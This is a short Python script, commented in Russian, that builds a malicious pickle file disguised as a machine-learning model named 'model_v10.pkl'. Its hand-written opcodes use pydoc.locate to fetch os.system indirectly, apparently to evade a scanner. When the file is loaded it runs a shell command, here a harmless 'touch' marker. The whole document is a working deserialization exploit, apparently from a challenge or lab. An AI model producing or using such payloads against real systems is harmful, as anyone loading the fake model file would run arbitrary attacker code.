import pickle

# Техника: Использование системного локатора pydoc
# 1. cpydoc\nlocate\n - загружаем функцию locate
# 2. Она сама найдет 'os.system'
# 3. Мы вызовем результат с нашей командой

payload = (
    b"cpydoc\nlocate\n"             # Загружаем pydoc.locate
    b"(S'os.system'\ntR"            # Вызываем locate('os.system') -> получаем функцию system
    b"(S'touch /app/PYDOC_WIN.txt'\ntR." # Вызываем полученную функцию и STOP
)

with open('model_v10.pkl', 'wb') as f:
    f.write(payload)

print("Модель 'model_v10.pkl' (The Pydoc Stealth) создана!")
